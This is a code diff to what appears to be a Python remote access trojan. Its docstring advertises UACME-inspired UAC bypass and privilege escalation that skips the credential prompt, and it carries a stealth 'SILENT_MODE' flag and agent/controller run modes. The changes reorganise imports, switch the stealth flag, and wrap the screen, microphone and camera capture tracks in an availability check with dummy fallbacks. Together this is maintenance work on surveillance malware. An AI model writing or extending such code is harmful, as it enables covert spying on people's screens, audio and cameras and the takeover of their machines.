@@ -1,4 +1,25 @@
 #CREATED BY SPHINX
+import os
+import sys
+import time
+import uuid
+import platform
+import threading
+import queue
+import subprocess
+import tempfile
+import base64
+import socket
+import json
+import random
+import logging
+import io
+import warnings
+try:
+    import urllib3
+except ImportError:
+    urllib3 = None
+
 """
 Advanced Python Agent with UACME-Inspired UAC Bypass Techniques
 
@@ -80,7 +101,7 @@ PRIVILEGE ESCALATION METHODS (BYPASS CREDENTIAL PROMPT):
 """
 
 # Configuration flags
-SILENT_MODE = True  # Enable stealth operation (no console output)
+SILENT_MODE = False  # Enable stealth operation (no console output)
 DEBUG_MODE = True  # Enable debug logging for troubleshooting
 DEPLOYMENT_COMPLETED = False  # Track deployment status to prevent repeated attempts
 RUN_MODE = 'agent'  # Track run mode: 'agent' | 'controller' | 'both'
@@ -181,21 +202,7 @@ def safe_import(module_name, feature_description=""):
 # eventlet already imported and patched at the top of the file
 
 # Standard library imports
-import time
-import urllib3
-import warnings
-import uuid
-import os
-import subprocess
-import threading
-import sys
-import random
-import base64
-import tempfile
-import io
 import wave
-import socket
-import json
 import asyncio
 import platform
 from collections import defaultdict
@@ -7136,10 +7143,11 @@ class LowLatencyInputHandler:
 # WEBRTC MEDIA STREAM TRACKS FOR LOW-LATENCY STREAMING
 # ========================================================================================
 
-class ScreenTrack(MediaStreamTrack):
-    """WebRTC MediaStreamTrack for screen capture with sub-second latency."""
-    
-    kind = "video"
+if AIORTC_AVAILABLE:
+    class ScreenTrack(MediaStreamTrack):
+        """WebRTC MediaStreamTrack for screen capture with sub-second latency."""
+        
+        kind = "video"
     
     def __init__(self, agent_id, target_fps=30, quality=85):
         super().__init__()
@@ -7245,10 +7253,10 @@ class ScreenTrack(MediaStreamTrack):
         self.frame_interval = 1.0 / self.target_fps
 
 
-class AudioTrack(MediaStreamTrack):
-    """WebRTC MediaStreamTrack for audio capture with low latency."""
-    
-    kind = "audio"
+    class AudioTrack(MediaStreamTrack):
+        """WebRTC MediaStreamTrack for audio capture with low latency."""
+        
+        kind = "audio"
     
     def __init__(self, agent_id, sample_rate=44100, channels=1):
         super().__init__()
@@ -7370,10 +7378,10 @@ class AudioTrack(MediaStreamTrack):
                 pass
 
 
-class CameraTrack(MediaStreamTrack):
-    """WebRTC MediaStreamTrack for camera capture with low latency."""
-    
-    kind = "video"
+    class CameraTrack(MediaStreamTrack):
+        """WebRTC MediaStreamTrack for camera capture with low latency."""
+        
+        kind = "video"
     
     def __init__(self, agent_id, camera_index=0, target_fps=30, quality=85):
         super().__init__()
@@ -7478,6 +7486,20 @@ class CameraTrack(MediaStreamTrack):
             except:
                 pass
 
+
+else:
+    # Dummy classes when WebRTC is not available
+    class ScreenTrack:
+        def __init__(self, *args, **kwargs):
+            pass
+    
+    class AudioTrack:
+        def __init__(self, *args, **kwargs):
+            pass
+    
+    class CameraTrack:
+        def __init__(self, *args, **kwargs):
+            pass
 
 # Fast serialization
 try:
